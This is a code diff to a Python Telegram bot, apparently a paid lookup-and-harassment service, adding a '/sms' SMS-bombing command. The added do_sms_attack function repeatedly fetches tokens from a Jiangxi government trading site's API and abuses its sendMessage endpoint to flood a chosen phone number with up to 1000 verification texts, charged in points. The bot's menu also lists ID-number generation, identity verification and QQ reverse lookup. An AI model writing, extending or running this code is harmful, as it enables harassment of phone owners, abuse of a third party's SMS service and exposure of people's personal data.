@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 import sys
-print("===== Bot 精简稳定版（每日签到得6积分）=====")
+print("===== Bot 精简稳定版（新增 /sms 刷短信功能）=====")
 
 import os, time, json, io, tempfile, requests, urllib3, logging, re, random, threading, hashlib, hmac, urllib.parse, base64, itertools
 from datetime import datetime
@@ -340,6 +340,7 @@ RECHARGE_AMOUNT = 1
 QF_QQ = 100
 BQ_NAME, BQ_TEMPLATE, BQ_SEX = range(101, 104)   # /bq 对话状态
 YS_NAME, YS_ID = range(200, 202)                 # /2ys 对话状态
+SMS_CHOICE = 300                                 # /sms 选择条数
 
 def start(update, context):
     context.user_data.clear()
@@ -355,6 +356,7 @@ def start(update, context):
            f"/bq → 身份证号补全（生成号码）\n"
            f"/2ys → 二要素核实（0.05积分）\n"
            f"/qf → QQ反查历史\n"
+           f"/sms → 短信轰炸\n"
            f"/okcz → USDT充值积分\n"
            f"/cx → 查询余额\n"
            f"/qd → 每日签到\n"
@@ -917,6 +919,150 @@ def ys_id(update, context):
     context.user_data.clear()
     return ConversationHandler.END
 
+# ===== /sms 刷短信功能 =====
+def do_sms_attack(chat_id, bot, target_count, phone, user_id):
+    """在后台线程中运行，发送短信并发送进度"""
+    token_url = "https://ggzyjy.jxsggzy.cn/jxtoolws/rest/jxpWvCharService/getWvCharToken"
+    sms_url = "https://ggzyjy.jxsggzy.cn/jxtoolws/rest/mobile/user/sendMessage"
+    headers = {
+        "Host": "ggzyjy.jxsggzy.cn",
+        "Connection": "keep-alive",
+        "charset": "utf-8",
+        "User-Agent": "Mozilla/5.0 (Linux; Android 14; RMX3920 Build/UKQ1.231108.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380353 MMWEBSDK/20240405 MMWEBID/8255 MicroMessenger/Lite Luggage/4.2.7 QQ/9.3.10.37675 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
+        "Content-Type": "application/json",
+        "Accept-Encoding": "gzip,compress,br,deflate",
+        "Referer": "https://servicewechat.com/wxeaf18610dab623b7/2/page-frame.html"
+    }
+    token_payload = {"appkey": "TPBidder"}
+    session = requests.Session()
+    count = 0
+    success_count = 0
+    fail_count = 0
+    last_progress = 0
+
+    try:
+        while count < target_count:
+            count += 1
+            try:
+                # 获取token
+                token_res = session.post(token_url, headers=headers, json=token_payload, timeout=5, verify=False)
+                if token_res.status_code != 200:
+                    fail_count += 1
+                    time.sleep(0.5)
+                    continue
+                res_data = token_res.json()
+                real_token = res_data["custom"]["token"]
+                # 发送短信
+                sms_payload = {
+                    "token": real_token,
+                    "params": {"mobilephone": phone}
+                }
+                sms_res = session.post(sms_url, headers=headers, json=sms_payload, timeout=5, verify=False)
+                if sms_res.status_code == 200 and sms_res.json().get('code') == 0:
+                    success_count += 1
+                else:
+                    fail_count += 1
+            except Exception:
+                fail_count += 1
+            time.sleep(0.5)
+
+            # 每10条发送一次进度
+            if count % 10 == 0 or count == target_count:
+                progress = (count / target_count) * 100
+                try:
+                    bot.send_message(chat_id, f"📤 进度：{count}/{target_count} ({progress:.1f}%) 成功{success_count}条 失败{fail_count}条")
+                except:
+                    pass
+        # 完成
+        bot.send_message(chat_id, f"✅ 刷短信完成！共发送 {count} 条，成功 {success_count} 条，失败 {fail_count} 条。")
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ 刷短信过程中出错：{e}")
+
+def sms_start(update, context):
+    """启动刷短信对话，让用户选择条数"""
+    context.user_data.clear()
+    keyboard = [
+        [InlineKeyboardButton("100条 (6积分)", callback_data="sms_100"),
+         InlineKeyboardButton("200条 (12积分)", callback_data="sms_200"),
+         InlineKeyboardButton("300条 (18积分)", callback_data="sms_300")],
+        [InlineKeyboardButton("400条 (24积分)", callback_data="sms_400"),
+         InlineKeyboardButton("500条 (30积分)", callback_data="sms_500"),
+         InlineKeyboardButton("1000条 (60积分)", callback_data="sms_1000")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    update.message.reply_text("请选择要发送的短信条数（每100条扣除6积分）：", reply_markup=reply_markup)
+    return SMS_CHOICE
+
+def sms_choice_callback(update, context):
+    query = update.callback_query
+    query.answer()
+    data = query.data
+    if not data.startswith("sms_"):
+        return
+    count = int(data.split("_")[1])
+    cost = (count // 100) * 6  # 每100条6积分
+    user_id = query.from_user.id
+    ensure_user(user_id)
+    stats = get_user_stats(user_id)
+    if stats['points'] < cost:
+        query.edit_message_text(f"❌ 积分不足，需要 {cost} 积分，当前 {stats['points']:.2f} 积分。请先充值或签到。")
+        return ConversationHandler.END
+
+    # 扣除积分
+    users[str(user_id)]['points'] = stats['points'] - cost
+    save_users()
+    query.edit_message_text(f"✅ 已扣除 {cost} 积分，剩余 {users[str(user_id)]['points']:.2f} 积分。\n请输入手机号（11位）：")
+    context.user_data['sms_count'] = count
+    context.user_data['sms_cost'] = cost
+    # 接下来等待用户输入手机号，但我们需要继续使用同一个对话？我们需要一个额外的状态来接收手机号。
+    # 但这里已经在SMS_CHOICE状态中，我们只能等待用户输入，但我们需要一个额外的状态来接收手机号。
+    # 我们将状态改为等待手机号，但我们现在在回调中，无法直接改变状态，需要设置下一个状态。
+    # 我们可以添加一个新的状态 SMS_PHONE，然后处理。
+    # 为了简便，我们可以在回调中直接询问手机号，然后设置 context.user_data['state'] = 'waiting_phone'，然后在下一个消息处理器中判断。
+    # 但更好的做法是进入一个新的状态。
+    # 由于我们只有 SMS_CHOICE 一个状态，我们可以复用同一个状态，但让处理函数区分。
+    # 我们可以设置一个标志 context.user_data['awaiting_phone'] = True
+    # 然后在下一个 MessageHandler 中处理手机号。
+    # 但 ConversationHandler 的状态是固定的，我们可以在 SMS_CHOICE 状态中处理文本消息（手机号）。
+    # 但 SMS_CHOICE 当前只注册了 CallbackQueryHandler，我们需要添加一个 MessageHandler 来处理文本。
+    # 最简单的是在 SMS_CHOICE 状态中同时添加 MessageHandler(Filters.text, sms_phone_input)
+    # 我们在注册时添加即可。
+    # 现在我们先设置 context.user_data['awaiting_phone'] = True
+    context.user_data['awaiting_phone'] = True
+    # 注意：我们已经在上面编辑了消息，还需要让用户知道输入手机号。
+    # 我们再发送一条消息提示
+    query.message.reply_text("请输入接收短信的手机号（11位数字）：")
+    return SMS_CHOICE  # 保持在同一个状态，等待文本消息
+
+def sms_phone_input(update, context):
+    """接收手机号并启动刷短信"""
+    if not context.user_data.get('awaiting_phone'):
+        # 如果不是在等待手机号，忽略（或提示）
+        update.message.reply_text("请先使用 /sms 命令选择条数。")
+        return ConversationHandler.END
+    phone = update.message.text.strip()
+    if not phone.isdigit() or len(phone) != 11:
+        update.message.reply_text("❌ 手机号必须是11位数字，请重新输入：")
+        return SMS_CHOICE
+    count = context.user_data.get('sms_count')
+    if not count:
+        update.message.reply_text("❌ 会话超时，请重新 /sms")
+        return ConversationHandler.END
+    user_id = update.effective_user.id
+    # 启动后台线程
+    bot = context.bot
+    chat_id = update.effective_chat.id
+    threading.Thread(target=do_sms_attack, args=(chat_id, bot, count, phone, user_id), daemon=True).start()
+    update.message.reply_text(f"🚀 开始刷短信，目标 {count} 条，请稍候... 进度会每10条通知一次。")
+    context.user_data.clear()
+    return ConversationHandler.END
+
+def sms_cancel(update, context):
+    """取消刷短信对话"""
+    context.user_data.clear()
+    update.message.reply_text("已取消刷短信")
+    return ConversationHandler.END
+
 # ===== 主程序 =====
 def main():
     global bot
@@ -998,6 +1144,19 @@ def main():
         states={
             YS_NAME: [MessageHandler(Filters.text, ys_name)],
             YS_ID: [MessageHandler(Filters.text, ys_id)],
+        },
+        fallbacks=[CommandHandler('cancel', cancel)],
+        allow_reentry=True
+    ))
+
+    # /sms 刷短信对话
+    dp.add_handler(ConversationHandler(
+        entry_points=[CommandHandler('sms', sms_start)],
+        states={
+            SMS_CHOICE: [
+                CallbackQueryHandler(sms_choice_callback, pattern='^sms_'),
+                MessageHandler(Filters.text & ~Filters.command, sms_phone_input)  # 处理手机号输入
+            ]
         },
         fallbacks=[CommandHandler('cancel', cancel)],
         allow_reentry=True
